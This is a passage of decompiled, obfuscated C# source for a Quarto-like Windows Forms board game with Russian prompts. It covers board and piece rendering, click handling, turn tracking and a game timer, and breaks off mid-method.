using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Cytotechnologist;

public class Form1 : Form
{
	public class Figurine
	{
		public bool Dark;

		public bool Big;

		public bool Square;

		public bool Point;

		public Figurine(bool dark, bool big, bool square, bool point)
		{
			while (true)
			{
				int num = 1203486356;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0x309C3F30u) % 8u)
					{
					case 6u:
						Square = square;
						num = ((int)num2 * -1461531228) ^ 0x55EFA7ED;
						continue;
					case 5u:
						Point = point;
						num = ((int)num2 * -400894633) ^ -1897606045;
						continue;
					case 4u:
						num = (int)((num2 * 1934389069) ^ 0x78C60E65);
						continue;
					case 3u:
						Dark = dark;
						num = ((int)num2 * -907064916) ^ 0x14599AA6;
						continue;
					case 2u:
						Big = big;
						num = ((int)num2 * -1064324795) ^ -1056284996;
						continue;
					case 1u:
						num = ((int)num2 * -896800399) ^ 0x5281AAAA;
						continue;
					default:
						return;
					case 7u:
						break;
					case 0u:
						return;
					}
					break;
				}
			}
		}

		public Figurine(Figurine copy)
		{
			while (true)
			{
				int num = -880212727;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0xF7C1D392u) % 4u)
					{
					case 3u:
						Dark = copy.Dark;
						num = ((int)num2 * -1367234921) ^ -702712743;
						continue;
					case 2u:
						Big = copy.Big;
						Square = copy.Square;
						Point = copy.Point;
						num = ((int)num2 * -526593427) ^ -1446118115;
						continue;
					default:
						return;
					case 0u:
						break;
					case 1u:
						return;
					}
					break;
				}
			}
		}
	}

	private Form menu;

	private Random rnd = Form1.smethod_0();

	private Figurine[,] storage;

	private Figurine[,] board;

	private readonly int size = 60;

	public bool turn;

	private DateTime time;

	private int step;

	private PictureBox[,] pictureBox;

	private PictureBox[,] borderBox;

	private IContainer components = null;

	private static Type ComMember;

	private PictureBox pictureBox1;

	private Button button2;

	private Button button1;

	private RichTextBox richTextBox1;

	private Panel panel1;

	private Label label1;

	private Label label2;

	private Label label5;

	private Label label6;

	public Timer timer1;

	public Form1()
	{
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Expected O, but got Unknown
		InitializeComponent();
		Form1.smethod_1(richTextBox1, (HorizontalAlignment)2);
		pictureBox = new PictureBox[4, 4];
		borderBox = new PictureBox[4, 4];
		for (int i = 0; i < 4; i++)
		{
			for (int j = 0; j < 4; j++)
			{
				double num = ((j < 2) ? 0.0 : 4.1);
				PictureBox[,] array = pictureBox;
				int num2 = i;
				int num3 = j;
				PictureBox obj = Form1.smethod_2();
				Form1.smethod_3((Control)(object)obj, new Size(size - 8, size - 8));
				Form1.smethod_4((Control)(object)obj, new Point(4 + (int)(((double)j + num) * (double)size), 4 + i * size));
				Form1.smethod_5((Control)(object)obj, Color.White);
				array[num2, num3] = obj;
				Form1.smethod_6((Control)(object)pictureBox[i, j], new MouseEventHandler(PictureBoxIJ_MouseDown));
				PictureBox[,] array2 = borderBox;
				int num4 = i;
				int num5 = j;
				PictureBox obj2 = Form1.smethod_2();
				Form1.smethod_3((Control)(object)obj2, new Size(size - 2, size - 2));
				Form1.smethod_4((Control)(object)obj2, new Point(1 + (int)(((double)j + num) * (double)size), 1 + i * size));
				Form1.smethod_7((Control)(object)obj2, bool_0: false);
				array2[num4, num5] = obj2;
				Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)pictureBox[i, j]);
				Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)borderBox[i, j]);
			}
		}
		Form3 form_ = new Form3();
		Form1.smethod_10((Form)(object)form_, (Form)(object)this);
		menu = (Form)(object)form_;
		Form1.smethod_11((Control)(object)menu);
	}

	private void Form1_LocationChanged(object sender, EventArgs e)
	{
		Form1.smethod_13(menu, new Point(Form1.smethod_12((Form)(object)this).X + 8, Form1.smethod_12((Form)(object)this).Y + 51));
	}

	private void Form1_Shown(object sender, EventArgs e)
	{
		Form1.smethod_14(menu);
		while (true)
		{
			int num = 49045543;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x25AF6F41u) % 3u)
				{
				case 1u:
					goto IL_000d;
				default:
					return;
				case 2u:
					break;
				case 0u:
					return;
				}
				break;
				IL_000d:
				num = ((int)num2 * -42422646) ^ -675311851;
			}
		}
	}

	public void Button1_Click(object sender, EventArgs e)
	{
		while (true)
		{
			int num = 1764099892;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x441CEDBBu) % 6u)
				{
				case 5u:
					num = 2041550899;
					continue;
				case 4u:
				{
					Form control_ = menu;
					Form1.smethod_17((Control)(object)control_, Form1.smethod_16((Control)(object)control_) + 5);
					num = ((int)num2 * -1251187880) ^ 0x6E67A0C2;
					continue;
				}
				case 3u:
					Form1.smethod_15(timer1);
					num = ((int)num2 * -1161960766) ^ 0x6CAEA05C;
					continue;
				case 1u:
				{
					int num3;
					if (Form1.smethod_16((Control)(object)menu) >= 296)
					{
						num = 1695856945;
						num3 = 1695856945;
					}
					else
					{
						num = 1172516094;
						num3 = 1172516094;
					}
					continue;
				}
				case 0u:
					break;
				default:
					Form1.smethod_14(menu);
					return;
				}
				break;
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		int num4 = default(int);
		int num3 = default(int);
		while (true)
		{
			int num = 1904911057;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x193A78FDu) % 19u)
				{
				case 18u:
				{
					int num6;
					if (num4 < 4)
					{
						num = 706509377;
						num6 = 706509377;
					}
					else
					{
						num = 446968476;
						num6 = 446968476;
					}
					continue;
				}
				case 17u:
				{
					int num5;
					if (num3 < 4)
					{
						num = 643828886;
						num5 = 643828886;
					}
					else
					{
						num = 1493421065;
						num5 = 1493421065;
					}
					continue;
				}
				case 16u:
					Paint_Board();
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = ((int)num2 * -1167262630) ^ -2062804558;
					continue;
				case 14u:
					num = ((int)num2 * -1564033559) ^ 0x6284D5FF;
					continue;
				case 13u:
					num4++;
					num = ((int)num2 * -1922252501) ^ 0x291E88DF;
					continue;
				case 12u:
					num3 = 0;
					num = 1002209748;
					continue;
				case 11u:
					num = ((int)num2 * -1328798961) ^ -1868082530;
					continue;
				case 10u:
					storage[num4, num3] = new Figurine(num4 < 2, num3 % 2 == 0, num3 < 2, num4 % 2 == 1);
					num = (int)(num2 * 1746881405) ^ -219926913;
					continue;
				case 9u:
					num = 1893652698;
					continue;
				case 7u:
					Form1.smethod_7((Control)(object)pictureBox[num4, num3], bool_0: false);
					num = ((int)num2 * -680819762) ^ -2071585306;
					continue;
				case 6u:
					Form1.smethod_5((Control)(object)borderBox[num4, num3], Color.White);
					num = ((int)num2 * -136402650) ^ 0x7953FD78;
					continue;
				case 5u:
					storage = new Figurine[4, 4];
					num4 = 0;
					num = ((int)num2 * -2069527104) ^ -646544366;
					continue;
				case 4u:
					board = new Figurine[4, 4];
					num = (int)(num2 * 771032708) ^ -169874322;
					continue;
				case 3u:
					num3++;
					num = (int)((num2 * 656195539) ^ 0x368E42F9);
					continue;
				case 2u:
					Paint_Storage();
					num = ((int)num2 * -534769464) ^ -350726883;
					continue;
				case 1u:
					num = (int)(num2 * 1067181300) ^ -1579428113;
					continue;
				case 0u:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = (int)(num2 * 1507312061) ^ -48394554;
					continue;
				default:
					return;
				case 8u:
					break;
				case 15u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Board()
	{
		Form1.smethod_20(pictureBox1, (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox1), Form1.smethod_16((Control)(object)pictureBox1)));
		Graphics graphics_ = default(Graphics);
		Brush brush_ = default(Brush);
		float num5 = default(float);
		int num6 = default(int);
		int num7 = default(int);
		float num8 = default(float);
		float num15 = default(float);
		float num11 = default(float);
		float num12 = default(float);
		bool square = default(bool);
		bool dark = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num = -916935990;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xF58FE56Cu) % 34u)
				{
				case 33u:
					Form1.smethod_24(graphics_, brush_, num5 + (float)(num6 * size), num5 + (float)(num7 * size), num8, num8);
					num = -1563858510;
					continue;
				case 32u:
					num15 = (float)size * num11;
					num = (int)(num2 * 618385149) ^ -90150826;
					continue;
				case 31u:
					Form1.smethod_24(graphics_, Form1.smethod_23(), ((float)num6 + 0.05f) * (float)size, ((float)num7 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = -2031587587;
					continue;
				case 30u:
					num7++;
					num = (int)((num2 * 1925009889) ^ 0x4D984A63);
					continue;
				case 29u:
					num5 = (float)size * (num12 / 2f);
					num = (int)((num2 * 1221515994) ^ 0x55BCFF55);
					continue;
				case 28u:
					brush_ = Form1.smethod_25();
					num = ((int)num2 * -1883242010) ^ 0x28B055FF;
					continue;
				case 27u:
					num = -1853089322;
					continue;
				case 26u:
					num12 = 1f - num11 * 0.4f / (float)Form1.smethod_27(2.0);
					num = -578293657;
					continue;
				case 25u:
					num11 = 1f;
					num = (int)(num2 * 1833860707) ^ -168566202;
					continue;
				case 24u:
					num5 = (float)size * (num12 / 2f);
					num8 = num15 * 0.9f / (float)Form1.smethod_27(2.0);
					square = board[num7, num6].Square;
					num = (int)(num2 * 1945135362) ^ -559739464;
					continue;
				case 23u:
					num = (int)(num2 * 811970650) ^ -664203585;
					continue;
				case 22u:
					num6 = 0;
					num = -1962338425;
					continue;
				case 21u:
					num8 = num15 * 0.4f / (float)Form1.smethod_27(2.0);
					num = ((int)num2 * -438691305) ^ 0x1B01FF34;
					continue;
				case 20u:
					dark = board[num7, num6].Dark;
					num = (int)(num2 * 179376862) ^ -590579082;
					continue;
				case 19u:
					flag = num7 < 4;
					num = -564039782;
					continue;
				case 18u:
					num12 = 1f - num11 * 0.9f / (float)Form1.smethod_27(2.0);
					num = -1342604804;
					continue;
				case 17u:
					Form1.smethod_28(graphics_, brush_, num5 + (float)(num6 * size), num5 + (float)(num7 * size), num8, num8);
					num = (int)(num2 * 1772985507) ^ -1257699925;
					continue;
				case 16u:
					num = (int)(num2 * 2143853410) ^ -288152705;
					continue;
				case 15u:
				{
					int num21;
					if (!board[num7, num6].Big)
					{
						num = -1276573456;
						num21 = -1276573456;
					}
					else
					{
						num = -818139079;
						num21 = -818139079;
					}
					continue;
				}
				case 14u:
					num6++;
					num = -247400415;
					continue;
				case 13u:
					num = (int)(num2 * 876798543) ^ -28953554;
					continue;
				case 12u:
				{
					int num19;
					int num20;
					if (!dark)
					{
						num19 = 490591692;
						num20 = 490591692;
					}
					else
					{
						num19 = 1520122248;
						num20 = 1520122248;
					}
					num = num19 ^ (int)(num2 * 1474516745);
					continue;
				}
				case 11u:
				{
					int num18;
					if (num6 < 4)
					{
						num = -1160248833;
						num18 = -1160248833;
					}
					else
					{
						num = -335032552;
						num18 = -335032552;
					}
					continue;
				}
				case 10u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num7 = 0;
					num = (int)(num2 * 1015990083) ^ -827022678;
					continue;
				case 9u:
				{
					int num16;
					int num17;
					if (board[num7, num6] != null)
					{
						num16 = 125479712;
						num17 = 125479712;
					}
					else
					{
						num16 = 1620611072;
						num17 = 1620611072;
					}
					num = num16 ^ (int)(num2 * 1202349430);
					continue;
				}
				case 8u:
					brush_ = Form1.smethod_26();
					num = -1446741901;
					continue;
				case 6u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num5 + (float)(num6 * size), num5 + (float)(num7 * size), num8, num8);
					num = ((int)num2 * -1716159965) ^ -1619331553;
					continue;
				case 5u:
				{
					int num13;
					int num14;
					if (!board[num7, num6].Point)
					{
						num13 = -1437667964;
						num14 = -1437667964;
					}
					else
					{
						num13 = -114782273;
						num14 = -114782273;
					}
					num = num13 ^ ((int)num2 * -1407077931);
					continue;
				}
				case 4u:
					num11 = 0.7f;
					num = -1966529846;
					continue;
				case 2u:
				{
					int num9;
					int num10;
					if (!flag)
					{
						num9 = -1467573159;
						num10 = -1467573159;
					}
					else
					{
						num9 = -243916882;
						num10 = -243916882;
					}
					num = num9 ^ ((int)num2 * -1076697208);
					continue;
				}
				case 1u:
					num = ((int)num2 * -876409536) ^ 0x62E30C8A;
					continue;
				case 0u:
				{
					int num3;
					int num4;
					if (!square)
					{
						num3 = 1019122949;
						num4 = 1019122949;
					}
					else
					{
						num3 = 1229644159;
						num4 = 1229644159;
					}
					num = num3 ^ ((int)num2 * -60110805);
					continue;
				}
				case 3u:
					break;
				default:
					Form1.smethod_30((Control)(object)pictureBox1);
					return;
				}
				break;
			}
		}
	}

	private void Paint_Storage()
	{
		Graphics graphics_ = default(Graphics);
		float num4 = default(float);
		float num6 = default(float);
		float num15 = default(float);
		Brush brush_ = default(Brush);
		bool flag3 = default(bool);
		int num7 = default(int);
		float num5 = default(float);
		bool dark = default(bool);
		bool point = default(bool);
		int num8 = default(int);
		bool flag = default(bool);
		float num3 = default(float);
		bool flag2 = default(bool);
		while (true)
		{
			int num = -2020357380;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xF70ED32Du) % 42u)
				{
				case 41u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num4, num4, num6, num6);
					num = (int)((num2 * 1031157010) ^ 0x28216E5C);
					continue;
				case 40u:
					num15 = 1f;
					num = (int)((num2 * 1873056179) ^ 0x2F227C5E);
					continue;
				case 39u:
					Form1.smethod_28(graphics_, brush_, num4, num4, num6, num6);
					num = ((int)num2 * -38853772) ^ 0x2B505695;
					continue;
				case 38u:
				{
					int num21;
					int num22;
					if (!flag3)
					{
						num21 = 1009036992;
						num22 = 1009036992;
					}
					else
					{
						num21 = 1708738186;
						num22 = 1708738186;
					}
					num = num21 ^ (int)(num2 * 601412458);
					continue;
				}
				case 37u:
					num7++;
					num = ((int)num2 * -1770839296) ^ 0x3C7C1FCA;
					continue;
				case 36u:
					brush_ = Form1.smethod_25();
					num = (int)((num2 * 1964499635) ^ 0x18D1505);
					continue;
				case 35u:
					num7 = 0;
					num = ((int)num2 * -1926558969) ^ -1560631844;
					continue;
				case 34u:
					Form1.smethod_24(graphics_, brush_, num4, num4, num6, num6);
					num = -450859472;
					continue;
				case 33u:
					num5 = (float)size * num15;
					num = (int)((num2 * 2034969516) ^ 0x14405430);
					continue;
				case 32u:
				{
					int num13;
					int num14;
					if (dark)
					{
						num13 = -77622071;
						num14 = -77622071;
					}
					else
					{
						num13 = -2024223147;
						num14 = -2024223147;
					}
					num = num13 ^ ((int)num2 * -1374822444);
					continue;
				}
				case 31u:
					point = storage[num7, num8].Point;
					num = (int)((num2 * 533869930) ^ 0x1DD0AB4);
					continue;
				case 30u:
					num = ((int)num2 * -1042853972) ^ -2064551486;
					continue;
				case 29u:
					flag = storage[num7, num8] != null;
					num = -143826071;
					continue;
				case 28u:
					num = ((int)num2 * -380222611) ^ 0x22196645;
					continue;
				case 27u:
					num = (int)(num2 * 1117347971) ^ -1108783626;
					continue;
				case 24u:
					Form1.smethod_30((Control)(object)pictureBox[num7, num8]);
					num = -1084954877;
					continue;
				case 23u:
					num = (int)(num2 * 1882379301) ^ -1812426012;
					continue;
				case 22u:
					num = (int)((num2 * 983153095) ^ 0x4387AAF7);
					continue;
				case 21u:
				{
					int num19;
					int num20;
					if (!point)
					{
						num19 = -516497269;
						num20 = -516497269;
					}
					else
					{
						num19 = -1794649796;
						num20 = -1794649796;
					}
					num = num19 ^ (int)(num2 * 1635880896);
					continue;
				}
				case 20u:
					num15 = 0.7f;
					num = -1681818798;
					continue;
				case 19u:
					num3 = 1f - num15 * 0.9f / (float)Form1.smethod_27(2.0);
					num = -2101395602;
					continue;
				case 18u:
				{
					int num17;
					int num18;
					if (num8 >= 2)
					{
						num17 = -1242838695;
						num18 = -1242838695;
					}
					else
					{
						num17 = -1956400540;
						num18 = -1956400540;
					}
					num = num17 ^ ((int)num2 * -1007237094);
					continue;
				}
				case 17u:
					num4 = (float)size * (num3 / 2f) - 4f;
					num = ((int)num2 * -165630288) ^ -542850250;
					continue;
				case 16u:
					num8++;
					num = -1313842946;
					continue;
				case 15u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox[num7, num8]));
					num = (int)((num2 * 741344489) ^ 0x5C35F021);
					continue;
				case 14u:
					num8 = 0;
					num = -2091901308;
					continue;
				case 13u:
					flag3 = num8 < 4;
					num = -306815385;
					continue;
				case 12u:
				{
					int num16;
					if (storage[num7, num8].Big)
					{
						num = -253341369;
						num16 = -253341369;
					}
					else
					{
						num = -1007793257;
						num16 = -1007793257;
					}
					continue;
				}
				case 11u:
					flag2 = num7 < 4;
					num = -1688638223;
					continue;
				case 10u:
					num3 = 1f - num15 * 0.4f / (float)Form1.smethod_27(2.0);
					num = -1419971575;
					continue;
				case 9u:
					num = ((int)num2 * -1589751107) ^ 0x4ED3402B;
					continue;
				case 8u:
					brush_ = Form1.smethod_26();
					num = -1217981343;
					continue;
				case 7u:
					Form1.smethod_20(pictureBox[num7, num8], (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox[num7, num8]), Form1.smethod_16((Control)(object)pictureBox[num7, num8])));
					num = (int)((num2 * 1298790593) ^ 0x30CC60D1);
					continue;
				case 6u:
				{
					int num11;
					int num12;
					if (flag2)
					{
						num11 = -1145195371;
						num12 = -1145195371;
					}
					else
					{
						num11 = -110213889;
						num12 = -110213889;
					}
					num = num11 ^ ((int)num2 * -1135901747);
					continue;
				}
				case 5u:
					num = (int)((num2 * 1526982340) ^ 0x70E6139A);
					continue;
				case 4u:
				{
					int num9;
					int num10;
					if (flag)
					{
						num9 = -1225202200;
						num10 = -1225202200;
					}
					else
					{
						num9 = -1972786449;
						num10 = -1972786449;
					}
					num = num9 ^ ((int)num2 * -1173340994);
					continue;
				}
				case 3u:
					dark = storage[num7, num8].Dark;
					num = ((int)num2 * -1700223965) ^ -1281032970;
					continue;
				case 2u:
					num = (int)(num2 * 781133950) ^ -1497618647;
					continue;
				case 1u:
					num6 = num5 * 0.9f / (float)Form1.smethod_27(2.0);
					num = (int)(num2 * 1280904481) ^ -177559686;
					continue;
				case 0u:
					num4 = (float)size * (num3 / 2f) - 4f;
					num6 = num5 * 0.4f / (float)Form1.smethod_27(2.0);
					num = ((int)num2 * -1271887733) ^ -836282520;
					continue;
				default:
					return;
				case 25u:
					break;
				case 26u:
					return;
				}
				break;
			}
		}
	}

	public void StartGame()
	{
		bool flag = default(bool);
		int num3 = default(int);
		bool flag3 = default(bool);
		int num6 = default(int);
		bool flag2 = default(bool);
		while (true)
		{
			int num = 1895916250;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x4C67C86Du) % 30u)
				{
				case 29u:
					step = 0;
					num = ((int)num2 * -1626985651) ^ -1898726389;
					continue;
				case 28u:
					flag = num3 < 4;
					num = 1239967795;
					continue;
				case 27u:
					Form1.smethod_35(timer1, bool_0: true);
					num = ((int)num2 * -820200061) ^ -1850894936;
					continue;
				case 26u:
					num = ((int)num2 * -1778881429) ^ -490817668;
					continue;
				case 25u:
					flag3 = turn;
					num = (int)(num2 * 2082093329) ^ -631733083;
					continue;
				case 24u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник выбрал фигуру. Выберете поле на доске для установки этой фигуры.");
					num = ((int)num2 * -1518912366) ^ 0x38234C53;
					continue;
				case 23u:
					num = ((int)num2 * -1617930048) ^ -841803685;
					continue;
				case 22u:
					num6 = 0;
					num = (int)((num2 * 74622273) ^ 0x2D4CF65C);
					continue;
				case 21u:
					Form1_Load(this, Form1.smethod_31());
					num = (int)(num2 * 1908657182) ^ -692096848;
					continue;
				case 20u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ваш ход. Выберете фигуру, которой будет играть противник.");
					num = (int)((num2 * 1008364990) ^ 0x2DDF8A6E);
					continue;
				case 19u:
					num = (int)(num2 * 1753665454) ^ -1586393661;
					continue;
				case 18u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = 751686488;
					continue;
				case 17u:
				{
					int num11;
					int num12;
					if (flag3)
					{
						num11 = -1789885661;
						num12 = -1789885661;
					}
					else
					{
						num11 = -1790670646;
						num12 = -1790670646;
					}
					num = num11 ^ ((int)num2 * -287331379);
					continue;
				}
				case 16u:
				{
					int num9;
					int num10;
					if (!flag2)
					{
						num9 = 1943869135;
						num10 = 1943869135;
					}
					else
					{
						num9 = 321164540;
						num10 = 321164540;
					}
					num = num9 ^ (int)(num2 * 844973959);
					continue;
				}
				case 15u:
					flag2 = num6 < 4;
					num = 350507521;
					continue;
				case 14u:
					step = 1;
					num = (int)((num2 * 1387016119) ^ 0x7C727BEB);
					continue;
				case 13u:
					Form1.smethod_7((Control)(object)pictureBox[num6, num3], bool_0: true);
					num3++;
					num = 175205583;
					continue;
				case 12u:
				{
					int num7;
					int num8;
					if (!flag)
					{
						num7 = 60306069;
						num8 = 60306069;
					}
					else
					{
						num7 = 1527140850;
						num8 = 1527140850;
					}
					num = num7 ^ ((int)num2 * -1314658575);
					continue;
				}
				case 10u:
					num6++;
					num = ((int)num2 * -1993510011) ^ -696249932;
					continue;
				case 9u:
					num = ((int)num2 * -1792879263) ^ 0x7793E664;
					continue;
				case 8u:
				{
					int num4 = Form1.smethod_33(rnd, 4);
					int num5 = Form1.smethod_33(rnd, 4);
					Form1.smethod_5((Control)(object)borderBox[num4, num5], Color.Blue);
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = (int)((num2 * 740370408) ^ 0x66B889A8);
					continue;
				}
				case 7u:
					num3 = 0;
					num = 1087492729;
					continue;
				case 6u:
					Form1.smethod_36(timer1);
					num = (int)(num2 * 404232477) ^ -951277509;
					continue;
				case 5u:
					num = (int)((num2 * 328820665) ^ 0x4B37BB41);
					continue;
				case 4u:
					time = new DateTime(0L, DateTimeKind.Unspecified);
					num = ((int)num2 * -661012197) ^ -547295866;
					continue;
				case 2u:
					num = 1216449931;
					continue;
				case 1u:
					num = ((int)num2 * -31360074) ^ -1608993429;
					continue;
				case 0u:
					num = (int)((num2 * 204555081) ^ 0x3CE5C77B);
					continue;
				default:
					return;
				case 11u:
					break;
				case 3u:
					return;
				}
				break;
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		time = time.AddSeconds(1.0);
		while (true)
		{
			int num = 1498160474;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x35B29413u) % 4u)
				{
				case 2u:
					num = (int)((num2 * 358398828) ^ 0x52A8A0B7);
					continue;
				case 1u:
					Form1.smethod_32((Control)(object)label1, Form1.smethod_34("Время: ", time.ToString("HH:mm:ss")));
					num = (int)(num2 * 2075853957) ^ -1067343300;
					continue;
				default:
					return;
				case 3u:
					break;
				case 0u:
					return;
				}
				break;
			}
		}
	}

	private void PictureBoxIJ_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_024f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0265: Expected O, but got Unknown
		int num3 = default(int);
		Point point = default(Point);
		int num4 = default(int);
		int num6 = default(int);
		int num5 = default(int);
		bool flag2 = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num = -969464235;
			while (true)
			{
				uint num2;
				int num7;
				switch ((num2 = (uint)num ^ 0xA4B490FFu) % 26u)
				{
				case 25u:
					num3 = 0;
					num = (int)(num2 * 1866226823) ^ -594667929;
					continue;
				case 24u:
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num = ((int)num2 * -689272737) ^ 0x76AF2724;
					continue;
				case 23u:
					Form1.smethod_32((Control)(object)richTextBox1, "Именно эта фигура? Если да - нажмите \"Подтвердить\".");
					num = ((int)num2 * -1968431839) ^ 0x61923C2A;
					continue;
				case 22u:
					num = (int)((num2 * 1020231589) ^ 0x5F51A2CB);
					continue;
				case 21u:
					if (storage[num4, num6] != null)
					{
						num = -1655559692;
						continue;
					}
					num7 = 0;
					goto IL_008b;
				case 20u:
				{
					num6 = point.X / size;
					int num10;
					int num11;
					if (num6 <= 1)
					{
						num10 = 613545866;
						num11 = 613545866;
					}
					else
					{
						num10 = 1467994601;
						num11 = 1467994601;
					}
					num = num10 ^ (int)(num2 * 1467909222);
					continue;
				}
				case 19u:
				{
					int num14;
					if (num5 >= 4)
					{
						num = -1004126155;
						num14 = -1004126155;
					}
					else
					{
						num = -1846128225;
						num14 = -1846128225;
					}
					continue;
				}
				case 17u:
				{
					int num12;
					int num13;
					if (!flag2)
					{
						num12 = 1546371103;
						num13 = 1546371103;
					}
					else
					{
						num12 = 1339307360;
						num13 = 1339307360;
					}
					num = num12 ^ (int)(num2 * 2027722180);
					continue;
				}
				case 16u:
					num6 -= 4;
					num = (int)(num2 * 1053304849) ^ -1973557636;
					continue;
				case 15u:
					num5 = 0;
					num = -2124695542;
					continue;
				case 14u:
					num = ((int)num2 * -844670703) ^ -1694813633;
					continue;
				case 13u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = (int)((num2 * 1815500358) ^ 0x42323818);
					continue;
				case 12u:
					num5++;
					num = ((int)num2 * -1223351474) ^ -1374205856;
					continue;
				case 11u:
					num = ((int)num2 * -1814698446) ^ 0xE731623;
					continue;
				case 10u:
					Form1.smethod_5((Control)(object)borderBox[num4, num6], Color.Red);
					num = (int)((num2 * 1637234898) ^ 0x7D67E554);
					continue;
				case 9u:
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num = (int)(num2 * 1344294678) ^ -1378503105;
					continue;
				case 8u:
					num3++;
					num = (int)((num2 * 684368592) ^ 0x335F6141);
					continue;
				case 7u:
					num = ((int)num2 * -1492338047) ^ 0x7EB9BDB9;
					continue;
				case 6u:
				{
					int num8;
					int num9;
					if (flag)
					{
						num8 = -365455426;
						num9 = -365455426;
					}
					else
					{
						num8 = -2069274141;
						num9 = -2069274141;
					}
					num = num8 ^ ((int)num2 * -1152596169);
					continue;
				}
				case 5u:
					num7 = ((Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox[num4, num6]), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0)) ? 1 : 0);
					goto IL_008b;
				case 4u:
					Form1.smethod_5((Control)(object)borderBox[num3, num5], Color.White);
					num = -212552891;
					continue;
				case 3u:
					num4 = point.Y / size;
					num = (int)(num2 * 431587326) ^ -2037593488;
					continue;
				case 2u:
					flag = num3 < 4;
					num = -1407311861;
					continue;
				case 1u:
					num = (int)((num2 * 1081403350) ^ 0x4FB2998A);
					continue;
				default:
					return;
				case 0u:
					break;
				case 18u:
					return;
					IL_008b:
					flag2 = (byte)num7 != 0;
					num = -527178146;
					continue;
				}
				break;
			}
		}
	}

	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_00ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_0100: Expected O, but got Unknown
		int num4 = default(int);
		Graphics graphics_ = default(Graphics);
		int num7 = default(int);
		int num8 = default(int);
		bool flag = default(bool);
		bool flag2 = default(bool);
		int num3 = default(int);
		while (true)
		{
			int num = 78793406;
			while (true)
			{
				uint num2;
				int num6;
				switch ((num2 = (uint)num ^ 0x6FE83197u) % 26u)
				{
				case 25u:
					num4++;
					num = (int)(num2 * 1311944591) ^ -421488979;
					continue;
				case 24u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.Red, 3f), ((float)num7 + 0.05f) * (float)size, ((float)num8 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -79978499) ^ -1498212292;
					continue;
				case 23u:
					num = (int)((num2 * 449254256) ^ 0x647BB1A8);
					continue;
				case 22u:
				{
					int num11;
					int num12;
					if (!flag)
					{
						num11 = 298382868;
						num12 = 298382868;
					}
					else
					{
						num11 = 1942342965;
						num12 = 1942342965;
					}
					num = num11 ^ (int)(num2 * 903138929);
					continue;
				}
				case 21u:
					num4 = 0;
					num = (int)((num2 * 2016098969) ^ 0x5F0241D1);
					continue;
				case 20u:
					num8 = Form1.smethod_39(e) / size;
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0))
					{
						num = ((int)num2 * -1136934429) ^ -1587063283;
						continue;
					}
					goto IL_0132;
				case 19u:
					flag2 = num3 < 4;
					num = 1662358763;
					continue;
				case 18u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = ((int)num2 * -1616978834) ^ -1430949659;
					continue;
				case 17u:
					num7 = Form1.smethod_38(e) / size;
					num = (int)(num2 * 1987454602) ^ -2013507111;
					continue;
				case 16u:
					if (board[num8, num7] == null)
					{
						num = 149609224;
						num6 = 149609224;
						continue;
					}
					goto IL_0132;
				case 15u:
					num = ((int)num2 * -94475403) ^ 0x6E2F1C61;
					continue;
				case 14u:
				{
					int num9;
					int num10;
					if (flag2)
					{
						num9 = -1167422699;
						num10 = -1167422699;
					}
					else
					{
						num9 = -1973222672;
						num10 = -1973222672;
					}
					num = num9 ^ (int)(num2 * 544763561);
					continue;
				}
				case 13u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num4, num3]), num7 * size + 4, num8 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					Form1.smethod_45(graphics_);
					num = (int)(num2 * 2010256845) ^ -142858010;
					continue;
				case 12u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = ((int)num2 * -1634258163) ^ -942422861;
					continue;
				case 10u:
				{
